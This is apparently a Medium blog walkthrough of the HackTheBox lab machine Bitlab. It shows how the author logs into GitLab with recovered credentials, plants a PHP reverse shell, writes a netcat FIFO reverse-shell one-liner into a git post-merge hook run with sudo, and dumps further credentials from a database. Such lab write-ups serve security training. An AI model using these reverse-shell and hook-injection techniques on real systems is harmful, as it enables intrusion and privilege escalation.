# Bitlab — HackTheBox

This is a write-up on how I solved Bitlab from HacktheBox.

![[https://www.hackthebox.eu/home/machines/profile/207](https://www.hackthebox.eu/home/machines/profile/207)](img/1__7jnFjA5aTcmtH7Vmp6dcXA.png)
[https://www.hackthebox.eu/home/machines/profile/207](https://www.hackthebox.eu/home/machines/profile/207)

This is a write-up on how I solved Bitlab from HacktheBox.

[Hack the Box](http://hackthebox.eu/) is an online platform to test and advance your skills in penetration testing and cybersecurity.

### about this box:

Bitlab is a medium difficulty box. Bitlab was such a good and fun box because it demonstrated real-life setups and vulnerabilities not because of old versions but because of how boxes are setup (over permission-binaries, reconfigured or over-exposed network services, people sticking keys in places they really should not be, etc).

### Recon:

Use `Nmap` to scan the target ports:

![](img/1__kR5RRWiqYyD4MDfahQMiqQ.png)

> **_nmap_** _Network exploration tool and security / port scanner_**_\-sV_** _(Version detection)   
> _**_\-sC_** _Performs a script scan using the default set of scripts._**_\-o_** _Output file._

Only two ports are opened **22** and **80**. We have **SSH** on port **22** and `Gitlab` on port **80**.

Without directory enumeration with the `Gobuster` we already know that there is `robots.txt` which has some disallowed entries.

![[https://gist.github.com/ls4cfk/6108e728798f1d82cf588578bd7f859f#file-robots-txt](https://gist.github.com/ls4cfk/6108e728798f1d82cf588578bd7f859f#file-robots-txt)](img/1__Gv87TTiK5NLs66bbNrc3gA.png)
[https://gist.github.com/ls4cfk/6108e728798f1d82cf588578bd7f859f#file-robots-txt](https://gist.github.com/ls4cfk/6108e728798f1d82cf588578bd7f859f#file-robots-txt)

If we look at the `/help/` entry we will see `bookmarks.html`

![](img/1__6d0FQUazeytbrbOfiV7N0A.png)

Which contains some elements, One of them contains obfuscated data

![[https://gist.github.com/ls4cfk/6108e728798f1d82cf588578bd7f859f#file-bookmarks-html](https://gist.github.com/ls4cfk/6108e728798f1d82cf588578bd7f859f#file-bookmarks-html)](img/1____ifw7ZYAnnT331O7uDQR2w.png)
[https://gist.github.com/ls4cfk/6108e728798f1d82cf588578bd7f859f#file-bookmarks-html](https://gist.github.com/ls4cfk/6108e728798f1d82cf588578bd7f859f#file-bookmarks-html)

After deobfuscation, we have a Username and Password.

> `clave:11des0081x`

![](img/1__zDhrmAKYDtsFcqrHuLBDHg.png)

And we are in!

![](img/1__0oa1m__c__LxXZxDOuL5BxFQ.png)

After the login into `Gitlab` we know that we have 2 projects and snippets. and with user `clave`, we probably can edit `index.php` in `Administrator/profile` project.

![](img/1__koHzh__PHjYerjOs7DKDvJw.png)

### Okay, time to get the Reverse shell.

Grab PHP reverse shell from Pentestermonkey — [reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

Then, get the IP address with `ifconfig tun0`

![](img/1__mbQD832HnHVvtVxhi0T7Ag.png)

After getting the IP address change the IP address in the reverse shell

![](img/1__dtm0QqOGociPu8vOAfk7eA.png)

And merge it:

![](img/1__7p2cWS4ffZ4Eds__7xWjX3w.png)

After that, Set Netcat listener with:

> `nc -nvlp 1234`

and to trigger the shell visit:

> `[http://10.10.10.114/profile/index.php](http://10.10.10.114/profile/index.php)`

![And we are in!](img/1______Rauxr0__99FjFLMfSQkPg.png)
And we are in!

We can execute git pull without root access with a www-data user.

![](img/1__es5SLwdQAoUd4UmrvCoIWQ.png)

To get the reverse shell as root, all we need is to add bash reverse shell in `.git/hooks/post-merge` and after git pull, it will execute the command.

![](img/1__bRqTrazulKfUqJ6cevxvIQ.png)

Let’s grab the profile(we can edit it as a `clave)` project on `/tmp/`

### Its all set.

![](img/1__KUN5Z__VVkgobsYCtsZ0QCg.png)

### Let’s get the reverse shell as a root!

> Add bash Shebang in .git/hooks/post-merge  
> `echo “#!/bin/bash” > .git/hooks/post-merge`

> Append reverse shell in .git/hooks/post-merge

> `echo “rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.137 1235 >/tmp/f” >> .git/hooks/post-merge`

> And give it execute permission

> `chmod +x .git/hooks/post-merge`

![](img/1__G5lQN4ONYi0d2wMMrZqILA.png)

Set up the listener with Netcat:

`nc -nvlp 1235`

And run:

`sudo git pull`

Whoops. The repository is already up to date.

![](img/1__OtJqhJKFV6L0ErtvxRl8IQ.png)

To trigger it we need to make some change on the repository.

Edit `README.md`

![](img/1__i2nyLOZmb7o5Y3dhawdf2g.png)

And merge it.

![](img/1__ZR3CnAUfExp__nDvJfgvlcA.png)

Okay, now we can trigger it.

`sudo git pull`

![](img/1__Fat8I0x1qzdH8NqdFa6WGw.png)

And we are root without getting the user.

**¯\\\_(ツ)\_/¯**

### let’s forgot about it and get the user from `www-data.`

Remember snippets from `Gitlab`? let’s check it.

Bingo! we have one snippet with a database name, username, and password.

The snippet executes query which returns all information from `profiles` table.

![](img/1__dipCN3xvcgeM8rBgHz3qXA.png)

I believe the simplest way to execute it is that change the index.php again (with the snippet) and just trigger it with browser.

![](img/1__0JWIxdKJWM7H9amWsURSPg.png)

By itself, it won't give us any information from the query.

Simple googling and we already know how to show all the results.

![](img/1__ZamPUITfXGHtj9e__VFpczg.png)

Commit, merge and open it with the browser.

> `[_http://10.10.10.114/profile/index.php_](http://10.10.10.114/profile/index.php)`

Oh boy. We got the credentials.

![](img/1__ZwFOSvH__r25NNn0IbsQNHg.png)

Huh? maybe the password is the whole text?

![](img/1__ZLHpFgywrGf11KYRYk8ilA.png)

Okay SSH without decoding the value.

![](img/1__EbH6pkkS__OO__sXj4gjMqjw.png)

And we are in, We got the user `clave`.

### Some reverse-engineering

We have RemoteConnection.exe in `/home/clave/`

let’s Download it with Netcat and do some reverse-engineering with OllyDbg.

Set up a listener on our machine with:

> nc -l -p 1234 > RemoteConnection.exe

and Send the file with:

> nc -w 3 10.10.15.137 < RemoteConnection.exe

And finally, check integrity with the md5sum command.

![](img/1__zff8mvJuWoI5HVOxwpTvaQ.png)

We got the file.

Before debugging let’s run strings on it.

![](img/1__MY3LBsuuBjV6Z9lWBKJuQg.png)

Mm, nothing really interesting. Maybe it does some SSH Connection? IDK.

### let’s see it with OllyDbg.

> OllyDbg is an x86 debugger that emphasizes binary code analysis, which is useful when source code is not available. It traces registers, recognizes procedures, API calls, switches, tables, constants and strings, as well as locates routines from object files and libraries. — [http://www.ollydbg.de/](http://www.ollydbg.de/)

So, it does some comparison and after that, it (if it matches) opens the connection.

![](img/1__x57gdG5Bzq4foAmiIKfUfA.png)

Open it with OllyDbg and set the breakpoint on `JNZ SHORT 00331662`

> JNZ is jump condition.

![](img/1__TqEwR46PFTcgBbgGRltD__g.png)

And run it.

![](img/1__TK4E__V__tTM6nQXkvybKfvg.png)

We have the command in ESI Registry which contains root password.

And we are root, **AGAIN**!

![](img/1__p80j7ePOP1iXG7YqNaH20w.png)

I hope you enjoyed!

Follow me for future posts.

Twitter — [https://twitter.com/ls4cfk](https://twitter.com/ls4cfk)

By [Aleksi Kistauri](https://medium.com/@aleksikistauri) on [January 11, 2020](https://medium.com/p/f9c361959c17).

[Canonical link](https://medium.com/@aleksikistauri/bitlab-hackthebox-f9c361959c17)

Exported from [Medium](https://medium.com) on January 12, 2020.
